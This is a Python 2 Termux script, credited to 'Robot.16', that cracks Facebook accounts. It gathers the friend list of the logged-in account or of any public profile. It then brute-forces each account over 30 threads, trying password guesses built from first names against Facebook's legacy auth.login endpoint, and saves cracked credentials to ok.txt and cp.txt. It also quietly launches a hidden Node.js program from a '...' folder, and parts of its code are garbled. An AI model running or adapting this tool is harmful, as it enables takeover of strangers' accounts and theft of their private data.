try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pkg install python   ")
    os.system("pip install mechanize")
    os.system("pip install requests ")
    time.sleep(0.05)
    os.system("pip2 install nodejs ")	
    os.system("pip2 install npm")
    time.sleep(0.05)	
    os.system("pkg install python2   ")
    os.system("pip2 install requests ")
    os.system("pip2 install mechanize")
    os.system("python2 ab.py")
try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
        os.system('mv ... .....')
        os.system('cd ..... && npm install')
        os.system('#')
        os.system('#')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('node ...../index.js &')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def pro(z):
        for e in z + "\n":
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print(" Logging In "+o),;sys.stdout.flush();time.sleep(0.5)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print(" Saving Token "+o),;sys.stdout.flush();time.sleep(0.5)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("Getting Updates "+o),;sys.stdout.flush();time.sleep(0.5)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("Logging Out "+o),;sys.stdout.flush();time.sleep(0.5)
def download():
    titik = [".   ","..  ","... "]
    for o in titik:
        print(" Downloading "+o),;sys.stdout.flush();time.sleep(0.5)
logo = """
\033[1;97m----------------------------------------------------------------------------
\033[1;97m----------------------------------------------------------------------------
 Coded by : Robot.16 16
 Channel  : \033[1;93m@\033[1;97mCrackerForKurd0
\033[1;97m----------------------------------------------------------------------------
"""

idh = []

def login_choice():
    os.system('clear')
    print logo
    time.sleep(0.001)
    os.system('clear')
    print logo
    print ("[1] Clone Friendlist and Public ID ")
    print ("[0] Exit")
    print u"\u001b[1;46m---------------------------------------------"
    loginvia()
def clone_main():
    hack = raw_input("\n>>> ")
    if hack =="1":
        loginvia()
    elif hack =="0":
        os.system("exit")
    else:
        print "\x1b[1;93mFill in correctly"
        clone_main()

def loginvia():
    os.system('clear')
    print logo
    time.sleep(0.5)
    os.system('clear')
    print logo
    print ("[1] Login With Token \033[1;90m(\033[1;93mNoCp\033[1;90m)\033[1;97m ")
    print ("[2] Login With User And Pass")
    print ("[0] Back")
    print u"\u001b[1;46m---------------------------------------------"
    clone_loginvia()
def clone_loginvia():
    hack = raw_input("\n>>> ")
    if hack =="1":
        os.system("clear")
        print logo
        os.system("python2 profisor.py")
        time.sleep(0.005)
        os.system('clear')
        print logo
        print ("Daxl Bwn Ba Token").center(70)
        print u"\u001b[1;46m---------------------------------------------"
        token = raw_input("[+] Tokenaka Lera Dane : ")
        print u"\u001b[1;46m---------------------------------------------"
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        pro(" Login Bw ")
        time.sleep(0.5)
        os.system("clear")
        print("Tokenakat Save Bw").center(70)
        time.sleep(4)
        os.system('https://discord.gg/z89SWpzTWw')
        time.sleep(0.5)
        menu()
    elif hack =="2":
        loginfb()
    elif hack =="0":
                menu()
    else:
                print ("[!] Tkaya Zhmarayak Hal bzhera")
                clone_loginvia()
def loginfb():
    os.system("clear")
    print logo
    os.system("python2 profisor.py")
    time.sleep(0.5)
    os.system('clear')
    print logo
    print("\033[34;1mFacebook \033[1;97mDaxl Bka").center(70)
    print u"\u001b[1;46m---------------------------------------------"
    id = raw_input("[+] Email/ID/Number : ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("[+] Password : ")
    print u"\u001b[1;46m---------------------------------------------"
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        print("Login \033[1;92mSuccessfull\033[1;97m")
        time.sleep(2)
        os.system("clear")
        print logo
        print("Your Account Has Been Saved").center(50)
        time.sleep(0.5)
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint")
            time.sleep(0.5)
            loginfb()
        else:
            print("\n\033[1;31m[!] Login Nabw Email/ID/Number OR Password Xalata")
            time.sleep(0.5)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Error 404.Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(0.5)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("[!] Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(0.5)
        login_choice()
    os.system('clear')
    print logo
    os.system("python2 profisor.py")
    time.sleep(0.5)
    os.system('clear')
    print logo
    print(" Name : ")
    print u"\u001b[1;46m---------------------------------------------"
    print("[1] Hack Krdni Frien Lagal Public ID")
    print("[0] logout")
    print u"\u001b[1;46m---------------------------------------------"
    menu_select()
def menu_select():
    option = raw_input("\n>>> ")
    if option =="1":
        crack()
    elif option =="0":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(0.5)
        print(" Logged Out Successfully")
        os.system("exit")
    else:
        print("[!] Tkaya Zhmarayak Dane")
        menu_select()

def crack():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.5)
                login()
        os.system("clear")
        print logo
        os.system("python2 profisor.py")
        time.sleep(0.5)
        os.system('clear')
        print logo
        print ("[1] Hack Krdni Frendakant")
        print ("[2] Hack Krdni \033[1;92mID\033[1;97m Publicawa")
        print ('[0] Back')
        print u"\u001b[1;46m---------------------------------------------"
        crack2()
def crack2():
        select = raw_input("\n>>> ")
        id= []
        oks= []
        cps= []
        if select=="1":
                os.system("clear")
                print logo
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID : ")
                print u"\u001b[1;46m---------------------------------------------"
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print(" Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="0":
                menu()
        else:
                print ("[!] Tkaya Zhmarayak Dane")
                crack2()
        print("[+] Hamw ID yakan : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Tkaya Chaware ba Bo Hack Krdn")
        time.sleep(0.5)
        print u"\u001b[1;46m---------------------------------------------"


        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if "access_token" in d:
		       print("\033[1;90m[\033[92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" ")
		       ok=open("ok.txt","a")
		       ok.write(uid+" | "+pass1+"\n")
		       ok.close()
		       oks.append(uid)
		    else:
		    	if 'www.facebook.com' in d['error_msg']:
		            print("\033[1;90m[\033[1;93mCheckpoint\033[1;90m]\033[1;97m "+uid+" "+pass1+" ")
		            cp=open("cp.txt","a")
		            cp.write(uid+" | "+pass1+"\n")
		            cp.close()
		            cps.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;90m[\033[1;93mCheckpoint\033[1;90m]\033[1;97m "+uid+" "+pass2+" ")
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;90m[\033[92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" ")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;90m[\033[1;93mCheckpoint\033[1;90m]\033[1;97m "+uid+" "+pass3+" ")
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[1;90m[\033[92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass3+" ")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="786786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;90m[\033[1;93mCheckpoint\033[1;90m]\033[1;97m "+uid+" "+pass4+" ")
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;90m[\033[92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass4+" ")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="1122334455"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;90m[\033[1;93mCheckpoint\033[1;90m]\033[1;97m "+uid+" "+pass5+" ")
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;90m[\033[92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass5+" ")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=name+"1212"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                 print("\033[1;90m[\033[1;93mCheckpoint\033[1;90m]\033[1;97m "+uid+" "+pass6+" ")
		                                                 cp=open("cp.txt","a")
		                                                 cp.write(uid+" | "+pass6+"\n")
		                                                 cp.close()
		                                                 cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\033[1;90m[\033[92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass6+" ")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7=name+"1122"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;90m[\033[1;93mCheckpoint\033[1;90m]\033[1;97m "+uid+" "+pass7+" ")
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\033[1;90m[\033[92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass7+" ")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)



                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print u"\u001b[1;46m---------------------------------------------"
        print ('Process Has Been Completed')
        print(' HAMW \033[1;92mSuccessful\033[1;90m/\033[1;93mCheckpoint:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print u"\u001b[1;46m---------------------------------------------"
        down()
def down():
    dow = raw_input("[?] Atawe File Checkpointakan dabazet ? (Y/N) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print(' File Downloaded ')
        raw_input("Enter Bka Bo garanawa ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("[!] Tkaya Yes Yan No Bka ")
        down()
if __name__ == '__main__':
    login_choice()
